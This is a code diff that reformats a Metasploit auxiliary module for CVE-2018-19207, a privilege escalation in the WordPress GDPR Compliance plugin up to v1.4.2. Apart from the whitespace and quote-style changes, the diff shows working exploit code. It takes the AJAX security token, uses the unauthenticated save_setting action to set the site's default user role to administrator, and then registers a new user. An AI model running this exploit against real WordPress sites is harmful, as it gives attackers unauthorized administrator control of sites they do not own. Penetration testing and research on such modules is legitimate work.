@@ -7,40 +7,39 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HTTP::Wordpress
 
   def initialize(info = {})
-    super(update_info(
-      info,
-      'Name'            => 'WordPress WP GDPR Compliance Plugin Privilege Escalation',
-      'Description'     => %q{
-        The Wordpress GDPR Compliance plugin <= v1.4.2 allows unauthenticated users to set
-        wordpress administration options by overwriting values within the database.
+    super(
+      update_info(
+        info,
+        'Name' => 'WordPress WP GDPR Compliance Plugin Privilege Escalation',
+        'Description' => %q{
+          The Wordpress GDPR Compliance plugin <= v1.4.2 allows unauthenticated users to set
+          wordpress administration options by overwriting values within the database.
 
-        The vulnerability is present in WordPress’s admin-ajax.php, which allows unauthorized
-        users to trigger handlers and make configuration changes because of a failure to do
-        capability checks when executing the 'save_setting' internal action.
+          The vulnerability is present in WordPress’s admin-ajax.php, which allows unauthorized
+          users to trigger handlers and make configuration changes because of a failure to do
+          capability checks when executing the 'save_setting' internal action.
 
-        WARNING: The module sets Wordpress configuration options without reading their current
-        values and restoring them later.
-      },
-      'Author'          =>
-        [
+          WARNING: The module sets Wordpress configuration options without reading their current
+          values and restoring them later.
+        },
+        'Author' => [
           'Mikey Veenstra (WordFence)', # Vulnerability discovery
           'Thomas Labadie' # Metasploit module
         ],
-      'License'         => MSF_LICENSE,
-      'References'      =>
-        [
+        'License' => MSF_LICENSE,
+        'References' => [
           ['URL', 'https://www.wordfence.com/blog/2018/11/privilege-escalation-flaw-in-wp-gdpr-compliance-plugin-exploited-in-the-wild/'],
           ['CVE', '2018-19207'],
           ['WPVDB', '9144']
         ],
-      'Notes'           =>
-        {
+        'Notes' => {
           'Stability' => [],
           'Reliability' => [],
           'SideEffects' => [CONFIG_CHANGES]
         },
-      'DisclosureDate'  => '2018-11-08'
-    ))
+        'DisclosureDate' => '2018-11-08'
+      )
+    )
 
     register_options [
       OptString.new('EMAIL', [true, 'Email for registration', nil]),
@@ -58,14 +57,14 @@ class MetasploitModule < Msf::Auxiliary
 
   def set_wp_option(name, value, ajax_security)
     res = send_request_cgi(
-      'method'    => 'POST',
-      'uri'       => wordpress_url_admin_ajax,
+      'method' => 'POST',
+      'uri' => wordpress_url_admin_ajax,
       'vars_post' => {
         'action' => 'wpgdprc_process_action',
         'security' => ajax_security,
         'data' => "{\"type\":\"save_setting\",\"append\":false,\"option\":\"#{name}\",\"value\":\"#{value}\"}"
-        }
-      )
+      }
+    )
 
     res && res.code == 200
   end
@@ -73,8 +72,8 @@ class MetasploitModule < Msf::Auxiliary
   def run
     print_status('Getting security token from host...')
     wp_home_res = send_request_cgi(
-      'method'    => 'GET',
-      'uri'       => target_uri.path
+      'method' => 'GET',
+      'uri' => target_uri.path
     )
 
     unless wp_home_res && wp_home_res.code == 200
@@ -99,13 +98,13 @@ class MetasploitModule < Msf::Auxiliary
 
     print_warning('Setting the default user role type to administrator...')
     unless set_wp_option('default_role', 'administrator', ajax_security)
-      print_error("Failed to set the default user role")
+      print_error('Failed to set the default user role')
       return
     end
 
     print_status("Registering #{datastore['USER']} with email #{datastore['EMAIL']}")
     unless (datastore['EMAIL'] =~ URI::MailTo::EMAIL_REGEXP) && wordpress_register(datastore['USER'], datastore['EMAIL'])
-      print_error("Failed to register user")
+      print_error('Failed to register user')
       return
     end
 
